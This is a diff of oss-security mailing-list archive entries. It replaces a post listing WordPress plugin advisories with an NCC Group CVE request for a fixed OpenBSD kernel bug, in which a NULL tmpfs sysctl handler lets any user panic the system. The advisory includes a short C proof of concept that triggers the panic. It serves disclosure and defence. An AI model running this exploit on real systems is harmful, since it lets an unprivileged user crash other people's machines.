@@ -1,28 +1,126 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/02/9
-Message-ID: <c89a113a-34d1-fb62-dd5d-f1a0b32eec67@securify.nl>
-Date: Tue, 2 Aug 2016 20:49:58 +0200
-From: Summer of Pwnage <lists@...urify.nl>
-To: oss-security@...ts.openwall.com
-Subject: Multiple vulnerabilities affecting seven WordPress (XSS, CSRF, SQLi)
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/26/6
+Message-ID: <4CC16782-C45C-496F-BFC3-FE533E54B172@nccgroup.trust>
+Date: Tue, 26 Jul 2016 14:32:03 -0400
+From: Jesse Hertz <jesse.hertz@...group.trust>
+To: <oss-security@...ts.openwall.com>
+CC: <cve-assign@...re.org>, Tim Newsham <Tim.Newsham@...group.trust>
+Subject: CVE Request: Any User Can Panic Kernel Through Sysctl on OpenBSD
 Content-Type: text/plain; charset=utf-8
 
-Please see attached advisories for more information. These issues were 
-found during Summer of Pwnage (https://sumofpwn.nl), a Dutch community 
-project. Its goal is to contribute to the security of popular, widely 
-used OSS projects in a fun and educational way.
+As part of NCC Group’s Project Triforce, a generic syscall fuzzing effort by
+myself and Tim Newsham, a new vulnerability was discovered in the
+OpenBSD kernel. It has been fixed now. Please assign a CVE for this issue.
+
+Risk: Medium
+
+Impact:
+Any user can panic the kernel by using the sysctl call.  If a
+user can manage to map a page at address zero, they may be able
+to gain kernel code execution and escalate privileges (OpenBSD fortunately prevents this by default).
+
+Description:
+When processing sysctl calls, OpenBSD dispatches through a number
+of intermediate helper functions.  For example, if the first integer
+in the path is 10, sys_sysctl() will call through vfs_sysctl() for
+further processing.  vfs_sysctl() performs a table lookup based on
+the second byte, and if the byte is 19, it selects the tmpfs_vfsops
+table and dispatches further processing through the vfs_sysctl method:
+
+    if (name[0] != VFS_GENERIC) {
+        for (vfsp = vfsconf; vfsp; vfsp = vfsp->vfc_next)
+            if (vfsp->vfc_typenum == name[0])
+                break;
+
+        if (vfsp == NULL)
+            return (EOPNOTSUPP);
+
+        return ((*vfsp->vfc_vfsops->vfs_sysctl)(&name[1], namelen - 1,
+            oldp, oldlenp, newp, newlen, p));
+    }
+
+Unfortunately, the definition for tmpfs_vfsops leaves this method NULL:
+
+struct vfsops tmpfs_vfsops = {
+    tmpfs_mount,            /* vfs_mount */
+    tmpfs_start,            /* vfs_start */
+    tmpfs_unmount,          /* vfs_unmount */
+    tmpfs_root,         /* vfs_root */
+    (void *)eopnotsupp,     /* vfs_quotactl */
+    tmpfs_statfs,           /* vfs_statfs */
+    tmpfs_sync,         /* vfs_sync */
+    tmpfs_vget,         /* vfs_vget */
+    tmpfs_fhtovp,           /* vfs_fhtovp */
+    tmpfs_vptofh,           /* vfs_vptofh */
+    tmpfs_init,         /* vfs_init */
+    NULL,               /* vfs_sysctl */
+    (void *)eopnotsupp,
+};
+
+Trying to read or write a sysctl path starting with (10,19) results
+in a NULL pointer access and a panic of
+"attempt to execute user address 0x0 in supervisor mode".
+Since any user can perform a sysctl read, this issue can be abused
+by any logged in user to panic the system.
+
+Fortunately, OpenBSD intentionally prevents users from attempting to map a page
+at the NULL address.  If an attacker is able to get such a mapping,
+they may be able to cause the kernel to jump to code mapped at this
+address (if other security protections such as SMAP/SMEP aren't in place).
+This would allow an attacker to gain kernel code execution and
+escalate their privileges.
+
+Reproduction:
+Run the PoC sysctl_tmpfs_panic.c program. It will pccess
+the (10,19,0) sysctl path and trigger a panic of
+"attempt to execute user address 0x0 in supervisor mode".
+NCC Group was able to reproduce this issue on OpenBSD 5.9 release
+running amd64.
+
+Recommendation:
+Include a NULL-pointer check in vfs_sysctl() before dispatching to
+the vfs_sysctl method.  Alternately, include a vfs_sysctl method
+in the tmpfs_vfsops table.
+
+Reported: 2016-07-21
+Fixed: http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/vfs_subr.c.diff?r1=1.248&r2=1.249
+          http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/tmpfs/tmpfs_vfsops.c.diff?r1=1.9&r2=1.10
+Assigned CVE: TBD
+
+PoC:
+
+// @author newsh
+
+#include <stdio.h>
+#include <sys/param.h>
+#include <sys/sysctl.h>
+
+int main(int argc, char **argv)
+{
+    int name[] = { 10, 19, 0 }; // vfs.tmpfs.0
+    char buf[16];
+    size_t sz = sizeof buf;
+    int x;
+
+    x = sysctl(name, 3, buf, &sz, 0, 0);
+    if(x == -1) perror("sysctl");
+    printf("no crash!\n");
+    return 0;
+}
 
 
-View attachment "cross_site_request_forgery_in_alo_easymail_newsletter_wordpress_plugin.txt" of type "text/plain" (4585 bytes)
+########
 
-View attachment "cross_site_scripting_in_contact_bank_wordpress_plugin.txt" of type "text/plain" (3767 bytes)
+About NCC:
+NCC Group is a security consulting company that performs all manner of
+security testing and has a strong desire to help make the industry a
+better, more resilient place. Because of this, when NCC Group
+identifies vulnerabilities in a system they prefer to work closely with
+vendors to create more secure systems. NCC Group strongly believes in
+responsible disclosure, and has strict guidelines in place to ensure
+that proper disclosure procedure is followed at all times. This serves
+the dual purpose of allowing the vendor to safely secure the product or
+system in question as well as allowing NCC Group to share cutting edge
+research or advisories with the security community.
 
-View attachment "cross_site_scripting_in_uji_countdown_wordpress_plugin.txt" of type "text/plain" (5928 bytes)
-
-View attachment "cross_site_scripting_in_wangguard_wordpress_plugin.txt" of type "text/plain" (4501 bytes)
-
-View attachment "cross_site_scripting_vulnerability_in_booking_calendar_wordpress_plugin.txt" of type "text/plain" (4946 bytes)
-
-View attachment "sql_injection_vulnerability_in_booking_calendar_wordpress_plugin.txt" of type "text/plain" (4023 bytes)
-
-View attachment "stored_cross_site_scripting_vulnerability_in_wp_live_chat_support_wordpress_plugin.txt" of type "text/plain" (5875 bytes)
+Download attachment "signature.asc" of type "application/pgp-signature" (497 bytes)
